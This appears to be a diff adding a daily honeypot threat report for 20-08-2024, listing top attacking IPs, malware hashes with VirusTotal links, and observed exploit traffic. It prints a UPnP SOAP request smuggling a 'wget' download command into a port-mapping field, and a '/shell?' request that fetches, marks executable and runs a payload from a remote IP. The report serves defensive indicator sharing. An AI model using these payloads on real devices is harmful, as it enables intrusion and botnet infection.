@@ -1,0 +1,49 @@
+Top 5 IPs for 20-08-2024 :
+
+43.153.68.27
+185.100.52.216
+175.150.179.47
+183.82.126.193
+196.20.68.81
+
+
+Malware Observed:
+
+File name : sshd
+a65eb77fc63484b9b8f3233b90572eb40b0aa2074d7a43ab7b9baacb230553c7
+https://www.virustotal.com/gui/file/a65eb77fc63484b9b8f3233b90572eb40b0aa2074d7a43ab7b9baacb230553c7
+
+
+608ee011537005f368c9731f4c4dee6a247b620cde52908ed0678df28c617971
+https://www.virustotal.com/gui/file/608ee011537005f368c9731f4c4dee6a247b620cde52908ed0678df28c617971
+
+
+7a48c93c5cb63a09505a009260d1cca8203285e0c1c6ff5b0df9cbb470820865
+https://www.virustotal.com/gui/file/7a48c93c5cb63a09505a009260d1cca8203285e0c1c6ff5b0df9cbb470820865
+
+
+d4e8c642ac8485d2ac316f16b5ed2285c93734c62a3e1bc2852a49f3737053c5
+https://www.virustotal.com/gui/file/d4e8c642ac8485d2ac316f16b5ed2285c93734c62a3e1bc2852a49f3737053c5
+
+
+d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+https://www.virustotal.com/gui/file/d7188b8c575367e10ea8b36ec7cca067ef6ce6d26ffa8c74b3faa0b14ebb8ff0
+
+
+Commands/exploits observed
+
+POST /picdesc.xml HTTP/1.1
+Host: 127.0.0.1:52869
+Content-Length: 630
+Accept-Encoding: gzip, deflate
+SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping
+Accept: */*
+User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)
+Connection: keep-alive
+
+<?xml version="1.0" ?><s:Envelope xmlns:s="http://schemas.xmlsoap.org/soap/envelope/" s:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><s:Body><u:AddPortMapping xmlns:u="urn:schemas-upnp-org:service:WANIPConnection:1"><NewRemoteHost></NewRemoteHost><NewExternalPort>47451</NewExternalPort><NewProtocol>TCP</NewProtocol><NewInternalPort>44382</NewInternalPort><NewInternalClient>`wget http://45.148.120.244/r -O /tmp/r;`</NewInternalClient><NewEnabled>1</NewEnabled><NewPortMappingDescription>syncthing</NewPortMappingDescription><NewLeaseDuration>0</NewLeaseDuration></u:AddPortMapping></s:Body></s:Envelope>
+
+
+
+
+/shell?cd+/tmp;rm+-rf+j;nohup+wget+http:/\\/154.216.18.196:88/j;chmod+777+j;./j
